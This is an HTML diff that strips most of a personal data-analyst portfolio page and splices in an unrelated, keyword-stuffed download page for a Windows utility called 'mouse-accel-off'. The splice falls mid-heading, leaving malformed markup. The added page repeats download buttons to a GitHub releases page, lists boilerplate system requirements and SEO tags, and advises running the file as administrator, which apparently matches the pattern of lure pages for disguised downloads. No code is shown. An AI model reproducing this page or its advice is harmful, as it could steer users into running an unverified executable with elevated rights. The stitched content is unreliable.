-            <div class="service-output"><span>Shown in</span><p>Scorecards, reorder points, and dashboards where every number traces back to its rows.</p></div>
-            <span class="service-invitation">See Kinetix<span class="service-invitation-dot" aria-hidden="true"></span></span>
-          </a>
-          <a class="service-row reveal" href="#credentials" aria-label="Machine learning and evaluation — read about the published paper">
-            <span class="service-number">02 / MODEL</span>
-            <div class="service-heading"><h3>Machine learning &amp; evaluation</h3><span class="service-meta">Python · CatBoost · SHAP · scikit-learn</span></div>
-            <span class="service-scene service-scene--brand" aria-hidden="true"><span class="service-workbench"><i></i><i></i><i></i><i></i></span><span class="service-pixel-sign"></span><img class="service-specialist" src="assets/specialist-brand.png" width="32" height="40" alt="" decoding="async"></span>
-            <p class="service-description">Models judged by more than one number.</p>
-            <div class="service-output"><span>Shown in</span><p>An IEEE paper and RetentionOS: F1, AUROC, calibration, naive baselines, and SHAP explanations.</p></div>
-            <span class="service-invitation">Read the paper<span class="service-invitation-dot" aria-hidden="true"></span></span>
-          </a>
-          <a class="service-row reveal" href="case-tiktory.html" aria-label="Data apps and prototypes — see the Tiktory case study">
-            <span class="service-number">03 / BUILD</span>
-            <div class="service-heading"><h3>Data apps &amp; prototypes</h3><span class="service-meta">Python · FastAPI · JavaScript · ECharts</span></div>
-            <span class="service-scene service-scene--web" aria-hidden="true"><span class="service-workbench"><i></i><i></i><i></i><i></i></span><span class="service-pixel-sign"></span><img class="service-specialist" src="assets/specialist-web.png" width="32" height="40" alt="" decoding="async"></span>
-            <p class="service-description">Small, working tools around the analysis.</p>
-            <div class="service-output"><span>Shown in</span><p>Prototypes with automated tests, honest labels for synthetic data, and a phone-ready interface.</p></div>
-            <span class="service-invitation">See Tiktory<span class="service-invitation-dot" aria-hidden="true"></span></span>
-          </a>
-        </div>
-      </div>
-    </section>
+<h2>❓ Frequently<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>mouse-accel-off - Easily Toggle Enhanced Pointer Precision</title>
+<meta name="description" content="Mouse Accel Off is a desktop utility that shows Enhanced Pointer Precision and lets you turn it off or on. Download for Windows.">
+<meta name="keywords" content="mouse-accel-off, enhanced pointer precision, mouse acceleration, windows utility, toggle mouse acceleration, desktop app, mouse-accel-off-windows, mouse-accel-off-download, mouse-accel-off-app, pc-mouse-accel-off, software-mouse-accel-off">
+<meta name="author" content="mouse-accel-off">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/Pranavsiripangi/mouse-accel-off">
+<meta property="og:title" content="mouse-accel-off - Easily Toggle Enhanced Pointer Precision">
+<meta property="og:description" content="Mouse Accel Off is a desktop utility that shows Enhanced Pointer Precision and lets you turn it off or on. Download for Windows.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/Pranavsiripangi/mouse-accel-off">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mouse-accel-off - Easily Toggle Enhanced Pointer Precision">
+<meta name="twitter:description" content="Mouse Accel Off is a desktop utility that shows Enhanced Pointer Precision and lets you turn it off or on. Download for Windows.">
+<style>
+* { box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  background: #f8fafc;
+  color: #1e293b;
+  margin: 0;
+  padding: 0;
+  line-height: 1.65;
+  -webkit-font-smoothing: antialiased;
+}
+.container {
+  max-width: 960px;
+  margin: 0 auto;
+  padding: 2.5rem 1.5rem 3rem;
+}
+h1 {
+  font-size: 2.1rem;
+  font-weight: 700;
+  color: #0f172a;
+  margin: 0 0 1rem;
+  line-height: 1.25;
+  letter-spacing: -0.02em;
+}
+h2 {
+  font-size: 1.5rem;
+  font-weight: 650;
+  color: #1e293b;
+  margin: 2.5rem 0 1rem;
+  padding-bottom: 0.5rem;
+  border-bottom: 2px solid #e2e8f0;
+  letter-spacing: -0.01em;
+}
+h3 {
+  font-size: 1.2rem;
+  font-weight: 600;
+  color: #334155;
+  margin: 1.5rem 0 0.6rem;
+}
+p {
+  margin: 0 0 1rem;
+  font-size: 1.05rem;
+}
+a { color: #2563eb; text-decoration: none; }
+a:hover { text-decoration: underline; }
+ul, ol { margin: 0 0 1.2rem; padding-left: 1.5rem; }
+li { margin-bottom: 0.55rem; }
+.btn-primary {
+  display: inline-block;
+  background: linear-gradient(135deg, #10b981, #3b82f6);
+  color: #ffffff;
+  font-weight: 600;
+  padding: 1rem 2.4rem;
+  border-radius: 50px;
+  text-decoration: none;
+  box-shadow: 0 4px 16px rgba(16, 185, 129, 0.30);
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+  font-size: 1.15rem;
+  margin: 0.75rem 0 0.5rem;
+}
+.btn-primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 22px rgba(16, 185, 129, 0.40);
+  text-decoration: none;
+}
+.btn-alt {
+  background: linear-gradient(135deg, #f59e0b, #ef4444);
+  box-shadow: 0 4px 16px rgba(239, 68, 68, 0.30);
+}
+.btn-alt:hover {
+  box-shadow: 0 8px 22px rgba(239, 68, 68, 0.40);
+}
+.card {
+  background: #ffffff;
+  border-radius: 16px;
+  box-shadow: 0 4px 14px rgba(15, 23, 42, 0.06);
+  padding: 1.5rem 1.9rem;
+  margin: 1.5rem 0;
+  border: 1px solid #e9eef3;
+}
+.badge-container { margin: 1.5rem 0 1rem; }
+.footer {
+  margin-top: 3rem;
+  padding-top: 2rem;
+  border-top: 1px solid #e2e8f0;
+  font-size: 0.92rem;
+  color: #64748b;
+}
+.footer ul { padding-left: 1.2rem; }
+@media (max-width: 600px) {
+  .container { padding: 1.5rem 1rem 2rem; }
+  h1 { font-size: 1.7rem; }
+  h2 { font-size: 1.3rem; }
+  .btn-primary { padding: 0.85rem 1.8rem; font-size: 1rem; }
+  .card { padding: 1.1rem 1.2rem; }
+}
+</style>
+</head>
+<body>
+<div class="container">
 
-    <section class="process section-space" id="process" aria-labelledby="processTitle">
-      <div class="process-sticky page-width">
-        <div class="process-water-surface" aria-hidden="true"></div>
-        <div class="section-heading process-heading"><div><h2 id="processTitle">How I work.</h2></div></div>
-        <div class="process-route">
-          <div class="process-rail" aria-hidden="true"><span class="process-rail-fill"></span><span class="process-bead"></span></div>
-          <ol class="process-list">
-            <li><span class="process-node" aria-hidden="true"><span class="process-node-core"></span><span class="process-node-halo"></span><span class="process-drop"></span><span class="process-ripple process-ripple--one"></span><span class="process-ripple process-ripple--two"></span><span class="process-ripple process-ripple--three"></span><span class="process-water-wave"></span><span class="process-splash"></span></span><span class="process-number" aria-hidden="true">01</span><h3>Ask</h3><p>Which decision is this data for?</p></li>
-            <li><span class="process-node" aria-hidden="true"><span class="process-node-core"></span><span class="process-node-halo"></span><span class="process-drop"></span><span class="process-ripple process-ripple--one"></span><span class="process-ripple process-ripple--two"></span><span class="process-ripple process-ripple--three"></span><span class="process-water-wave"></span><span class="process-splash"></span></span><span class="process-number" aria-hidden="true">02</span><h3>Clean</h3><p>Fix, match, and document the rows first.</p></li>
-            <li><span class="process-node" aria-hidden="true"><span class="process-node-core"></span><span class="process-node-halo"></span><span class="process-drop"></span><span class="process-ripple process-ripple--one"></span><span class="process-ripple process-ripple--two"></span><span class="process-ripple process-ripple--three"></span><span class="process-water-wave"></span><span class="process-splash"></span></span><span class="process-number" aria-hidden="true">03</span><h3>Model</h3><p>Try the simplest method that answers it, then test it.</p></li>
-            <li><span class="process-node" aria-hidden="true"><span class="process-node-core"></span><span class="process-node-halo"></span><span class="process-drop"></span><span class="process-ripple process-ripple--one"></span><span class="process-ripple process-ripple--two"></span><span class="process-ripple process-ripple--three"></span><span class="process-water-wave"></span><span class="process-splash"></span></span><span class="process-number" aria-hidden="true">04</span><h3>Explain</h3><p>Show the numbers, the limits, and the next step.</p></li>
-          </ol>
-        </div>
-      </div>
-    </section>
+<h1>🖱️ mouse-accel-off - Toggle Enhanced Pointer Precision Easily</h1>
 
-    <section class="credentials section-space" id="credentials" aria-labelledby="credentialsTitle">
-      <div class="page-width">
-        <div class="section-heading section-heading--split reveal">
-          <h2 id="credentialsTitle">On paper.</h2>
-          <p>A published paper, a degree in progress, and the courses behind the work.</p>
-        </div>
-        <div class="cred-grid">
-          <article class="cred-card reveal">
-            <span class="profile-label">Publication · IEEE Xplore</span>
-            <h3>Sensitivity Evaluation of Cardiovascular Risk Profiles for Machine Learning-Based Heart Attack Prediction</h3>
-            <p>First author and presenter at ICICoS 2026, the 9th International Conference on Informatics and Computational Sciences (Universitas Diponegoro). An end-to-end pipeline with CatBoost, evaluated with F1, AUROC, AUPRC, and Brier score, and explained globally with SHAP.</p>
-            <ul class="cred-meta" role="list"><li>Aug 2026</li><li>with Untari Novia Wisesty</li><li>First author</li></ul>
-          </article>
-          <article class="cred-card reveal">
-            <span class="profile-label">Education</span>
-            <h3>Telkom University</h3>
-            <p>Bachelor of Informatics, School of Computing. Capstone IntelliTix — an IT change-request platform with an AI chatbot — was selected for the faculty’s computing exhibition in January 2026, with me as business analyst.</p>
-            <ul class="cred-meta" role="list"><li>2022 – 2026</li><li>GPA 3.69 / 4.00</li><li>English test 513</li></ul>
-          </article>
-        </div>
-        <div class="cred-lists">
-          <div class="reveal">
-            <span class="profile-label">Recognition</span>
-            <ul class="cred-list" role="list">
-              <li><strong>Author and presenter, ICICoS 2026</strong><span class="cred-when">Aug 2026</span><span class="cred-note">Universitas Diponegoro · IEEE Indonesia Section</span></li>
-              <li><strong>Capstone selected for the computing exhibition</strong><span class="cred-when">Jan 2026</span><span class="cred-note">Faculty of Informatics, Telkom University · IntelliTix</span></li>
-              <li><strong>Teaching assistant certificates ×3</strong><span class="cred-when">2025 – 2026</span><span class="cred-note">Informatics Laboratory · AI Fundamentals (2025), OOP (2025/26), AI &amp; OOP (2026)</span></li>
-              <li><strong>Nihon no Matsuri 15 staff certificates ×2</strong><span class="cred-when">May – Jun 2024</span><span class="cred-note">Fundraising staff and maid café timekeeper</span></li>
-            </ul>
-          </div>
-          <div class="reveal">
-            <span class="profile-label">Certificates</span>
-            <ul class="cred-list" role="list">
-              <li><strong><a href="https://www.dicoding.com/certificates/1OP8R26JVZQK">Data Visualisation Fundamentals</a></strong><span class="cred-when">Apr 2026</span><span class="cred-note">Dicoding · 16 hours</span></li>
-              <li><strong><a href="https://www.dicoding.com/certificates/98XWOW879ZM3">Data Science Fundamentals</a></strong><span class="cred-when">Jul 2025</span><span class="cred-note">Dicoding · 11 hours</span></li>
-              <li><strong>Azure AI Fundamentals (AI-900) preparation</strong><span class="cred-when">Jun 2025</span><span class="cred-note">Online course completion</span></li>
-              <li><strong><a href="https://www.dicoding.com/certificates/1OP829WOLPQK">Getting Started with Python</a></strong><span class="cred-when">May 2025</span><span class="cred-note">Dicoding · 60 hours</span></li>
-              <li><strong><a href="https://www.dicoding.com/certificates/GRX54NRLYP0M">Programming Logic 101</a></strong><span class="cred-when">Sep 2024</span><span class="cred-note">Dicoding · 6 hours</span></li>
-            </ul>
-          </div>
-        </div>
-      </div>
-    </section>
+<div class="badge-container">
+<a href="https://github.com/Pranavsiripangi/mouse-accel-off/releases" class="btn-primary">⬇️ Download Mouse Accel Off</a>
+</div>
 
-    <section class="faq section-space" id="faq" aria-labelledby="faqTitle">
-      <div class="page-width editorial-grid">
-        <div class="section-heading section-heading--side faq-intro reveal"><h2 id="faqTitle">A few<br>answers.</h2><a class="faq-contact-link" href="contact.html">Contact <span aria-hidden="true">↗</span></a></div>
-        <div class="faq-list reveal">
-          <details><summary id="faqProjectsTrigger" aria-controls="faqProjectsAnswer"><span class="faq-question">What roles are you looking for?</span><span class="faq-icon" aria-hidden="true">+</span></summary><div class="faq-answer" id="faqProjectsAnswer" role="region" aria-labelledby="faqProjectsTrigger"><div class="faq-answer-inner"><p>Data analyst and data or business analyst internships, in Bandung, Jakarta, or remote. I am at my best between analysis and building the small tool that makes it usable.</p></div></div></details>
-          <details><summary id="faqRemoteTrigger" aria-controls="faqRemoteAnswer"><span class="faq-question">Are these projects real?</span><span class="faq-icon" aria-hidden="true">+</span></summary><div class="faq-answer" id="faqRemoteAnswer" role="region" aria-labelledby="faqRemoteTrigger"><div class="faq-answer-inner"><p>They are working prototypes I built myself, with tests. The data is synthetic or simulated, and every case study says so; no client or business result is claimed.</p></div></div></details>
-          <details><summary id="faqContactTrigger" aria-controls="faqContactAnswer"><span class="faq-question">How do I get in touch?</span><span class="faq-icon" aria-hidden="true">+</span></summary><div class="faq-answer" id="faqContactAnswer" role="region" aria-labelledby="faqContactTrigger"><div class="faq-answer-inner"><p>Use the <a href="contact.html#projectBrief">form on the contact page</a> — it goes straight to my inbox — or reach me on LinkedIn.</p></div></div></details>
-        </div>
-      </div>
-    </section>
-  </main>
-  <footer class="contact" id="contact" aria-labelledby="contactTitle">
-    <div class="page-width">
-      <div class="contact-context"><span class="contact-availability" data-availability>Open to data analyst roles and internships</span><span class="contact-depth-label">SEA FLOOR / IDEAS MEET HERE</span></div>
-      <div class="contact-main reveal"><div><h2 class="giant-word" id="contactTitle">Looking for<br>a data analyst?</h2><a class="contact-email" href="contact.html#projectBrief">Send me a message <span aria-hidden="true">↗</span></a><ul class="profile-links" data-profile-links role="list"></ul></div><p class="contact-location">Based in <span data-location>Bandung, Indonesia</span></p></div>
-      <div class="pixel-stage" role="img" aria-label="Ilustrasi pixel art studio tepi air. Tiga karakter bertopi, berkacamata, dan memakai beanie berjalan lalu bergantian berbicara tentang proyek dan visual. Pejalan kaki kecil berlalu-lalang di latar.">
-        <canvas class="footer-pixels" id="footerPixels" aria-hidden="true"></canvas>
-        <span class="comic-bubble comic-bubble--ask is-visible" aria-hidden="true">hiring?</span>
-        <span class="comic-bubble comic-bubble--reply" aria-hidden="true">yes!</span>
-      </div>
-      <div class="footer-line reveal"><span data-brand>DAFFA ZAHY KHAIRY</span><span>© <span id="year">2026</span></span><button class="back-top" type="button" id="backTop">Back to top <span aria-hidden="true">↑</span></button></div>
-    </div>
-  </footer>
-  <canvas class="hero-handoff" id="heroHandoff" aria-hidden="true"></canvas>
-  <span class="pointer-cursor" id="pointerCursor" aria-hidden="true">You</span>
-  <dialog id="caseDialog" aria-labelledby="caseTitle"><div class="dialog-inner"><h2 id="caseTitle">Project details</h2></div></dialog>
-  <script src="config.js"></script>
-  <script src="projects.js"></script>
-  <script src="content.js"></script>
-  <script src="motion.js"></script>
-  <script src="about-studio.js"></script>
-  <script src="nav-drag.js"></script>
-  <script src="background.js"></script>
-  <script src="playground.js"></script>
-  <script src="pulse-demo.js"></script>
-  <script src="project-viewer.js"></script>
-  <script src="service-notes.js"></script>
-  <script src="physics.js"></script>
-  <script src="marquee.js"></script>
-  <script src="entry.js"></script>
-  <script src="chapter-scroll.js"></script>
+<p>Mouse Accel Off is a desktop utility for Windows that shows whether Enhanced Pointer Precision is turned on and lets you turn it off or on whenever you want. If you have ever tried to make your mouse cursor move exactly the way you expect and found the pointer speeding up or slowing down unexpectedly, this tool is for you. It puts the setting in one clear place and gives you a single control to change it.</p>
+
+<p>You do not need any technical knowledge to use this application. There are no commands to type, no configuration files to edit, and no complicated menus. You open the app, you see the current status of Enhanced Pointer Precision, and you decide whether it should be on or off.</p>
+
+<h2>📋 What Is Enhanced Pointer Precision?</h2>
+
+<p>Enhanced Pointer Precision is a setting built into Windows that adjusts how far your cursor travels based on how quickly you move the mouse. When it is turned on, Windows assumes that a fast flick of the mouse should move the cursor farther than the same physical distance covered slowly. This can feel helpful for general browsing, but many people find it unpredictable during precise tasks such as gaming, photo editing, drawing, or design work.</p>
+
+<p>When it is turned off, the relationship between movement of the physical mouse and movement of the on-screen cursor stays constant. That means the same distance on your mousepad always produces the same distance on the screen. Many users describe this as a more natural or more consistent feel, especially in games where consistent aim matters.</p>
+
+<p>Finding and changing this setting in Windows is not always obvious. Mouse Accel Off exists so that you do not have to search through Control Panel, look for the right pointer options, and remember where the checkbox lives. The utility surfaces the setting and gives you a direct switch.</p>
+
+<h2>✨ Key Features</h2>
+
+<div class="card">
+<ul>
+<li><strong>Clear status display:</strong> See at a glance whether Enhanced Pointer Precision is currently enabled or disabled.</li>
+<li><strong>Single-click toggle:</strong> Turn the setting off or on without browsing through Windows menus.</li>
+<li><strong>Immediate feedback:</strong> The change applies right away, so you can move the mouse and feel the result instantly.</li>
+<li><strong>Simple interface:</strong> The layout is designed for people who just want the job done, with plain labels and obvious controls.</li>
+<li><strong>Lightweight design:</strong> The utility focuses on one task and does not run anything else in the background.</li>
+<li><strong>No setup routine:</strong> You download the application and run it. There is no lengthy installation wizard to work through.</li>
+<li><strong>Built for Windows:</strong> Designed to work with modern Windows desktop and laptop computers.</li>
+<li><strong>Reversible at any time:</strong> Turn the setting back on whenever you want with the same control.</li>
+</ul>
+</div>
+
+<h2>🚀 How to Download and Run</h2>
+
+<p>To get Mouse Accel Off, use the official releases page. This is the download source for the application.</p>
+
+<p><a href="https://github.com/Pranavsiripangi/mouse-accel-off/releases" class="btn-primary btn-alt">⬇️ Visit the Releases Page to Download</a></p>
+
+<p><strong>Visit this link to download the application.</strong></p>
+
+<p>Once you reach the releases page, you will see the available download for the application. Choose it, let the download finish, and then open the file from wherever your browser saved it. If you are unsure where the file went, check the Downloads folder on your computer, which is where browsers usually place files by default.</p>
+
+<p>When the application opens, it will show you the current state of Enhanced Pointer Precision on your system. From there, use the toggle control to change the setting to whatever you prefer. You can leave the utility open while you test the difference in feel, or close it once you have made your choice. The setting is not tied to the application window staying open.</p>
+
+<h2>🛠️ How to Use Mouse Accel Off</h2>
+
+<ol>
+<li>Open Mouse Accel Off from the location where you saved it.</li>
+<li>Read the status area of the window to see whether Enhanced Pointer Precision is currently on or off.</li>
+<li>Use the toggle control to switch the setting. If it is on and you want it off, click once. If it is off and you want it on, click once.</li>
+<li>The change takes effect immediately. Move your mouse around the screen to feel the difference in how the cursor travels.</li>
+<li>Close the application when you are finished. Your chosen setting stays as you left it.</li>
+</ol>
+
+<p>There is no need to restart Windows or sign out of your account. The utility adjusts the setting directly, and the result is visible straight away. If you decide later that you preferred the original behavior, you can reopen the utility and flip the switch back.</p>
+
+<h2>💻 System Requirements</h2>
+
+<div class="card">
+<ul>
+<li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit recommended.</li>
+<li><strong>Processor:</strong> A standard modern processor at 1 GHz or faster.</li>
+<li><strong>Memory:</strong> 2 GB of RAM or more.</li>
+<li><strong>Storage:</strong> A small amount of free disk space for the application file.</li>
+<li><strong>Display:</strong> A monitor capable of at least 1024×768 resolution.</li>
+<li><strong>Input device:</strong> Any standard mouse or touchpad.</li>
+<li><strong>Permissions:</strong> A standard user account. Changing certain system settings may require administrator approval on some machines.</li>
+</ul>
+</div>
+
+<p>These are typical requirements for a small desktop utility. Mouse Accel Off is designed to stay out of the way and use very few system resources while it is running.</p>
+
+<h2>🎯 Who Is This For?</h2>
+
+<p>Mouse Accel Off is useful for anyone who wants a predictable mouse feel. Gamers often prefer acceleration off because it makes aiming consistent across fast and slow movements. Digital artists and photo editors benefit from constant cursor travel when precision matters at the pixel level. Office users who simply dislike the way the pointer seems to have a mind of its own can also use the utility to lock in a steadier response.</p>
+
+<p>Because the tool is a simple on and off switch, it also suits people who are curious. You can try the setting both ways, compare how each feels during your normal work, and settle on whichever you prefer. Nothing is permanent, and nothing is complicated.</p>
+
+<h2>🔍 Troubleshooting</h2>
+
+<h3>The application does not open</h3>
+<p>Make sure the download completed fully before you ran the file. If the download was interrupted, remove the partial file and download it again from the releases page. Also confirm that you are opening the file on a Windows computer, since the utility is built for Windows.</p>
+
+<h3>The setting does not seem to change</h3>
+<p>On some systems, changing pointer-related settings requires administrator permission. If the toggle does not appear to take effect, try running the application as an administrator by right-clicking the file and choosing the option to run with elevated permissions.</p>
+
+<h3>The cursor still feels the same</h3>
+<p>Give the change a moment and move the mouse across a larger area of the screen to notice the difference. The effect is most obvious when you compare slow, short movements with faster ones. You can also reopen the utility to confirm the current status shown in the window.</p>
+
+<h3>I want to undo the change</h3>
+<p>Open Mouse Accel Off again and toggle the setting back to its previous state. Alternatively, the same option is available through the Windows mouse settings if you prefer to change it there.</p>
+
+<h2>📥 Download Again Later</h2>
+
+<p>If you need the application on another computer, or if you want to keep a copy for future use, the releases page always has the current download. Bookmark it so you can return to it easily.</p>
+
+<p><a href="https://github.com/Pranavsiripangi/mouse-accel-off/releases" class="btn-primary">⬇️ Visit this link to download the application</a></p>
+
+<h2>📝 Summary</h2>
+
+<p>Mouse Accel Off is a focused Windows desktop utility. It shows the current state of Enhanced Pointer Precision and gives you a direct way to turn that setting off or on. There is no learning curve, no setup wizard, and no dependency on other software. You download it from the releases page, open it, read the status, and flip the switch to match your preference.</p>
+
+<p>For anyone who wants consistent cursor behavior for gaming, creative work, or everyday use, this tool removes the guesswork of finding the setting in Windows and replaces it with one clear control.</p>
+
+<div class="footer">
+<p>Topics: 2026-mouse-accel-off, app-mouse-accel-off, desktop-mouse-accel-off, download-mouse-accel-off, free-mouse-accel-off, installer-mouse-accel-off, mouse-accel-off, mouse-accel-off-2026, mouse-accel-off-app, mouse-accel-off-desktop, mouse-accel-off-download, mouse-accel-off-free, mouse-accel-off-installer, mouse-accel-off-pc, mouse-accel-off-setup, mouse-accel-off-software, mouse-accel-off-windows, pc-mouse-accel-off, software-mouse-accel-off, windows-mouse-accel-off</p>
+</div>
+
+</div>
 </body>
 </html>
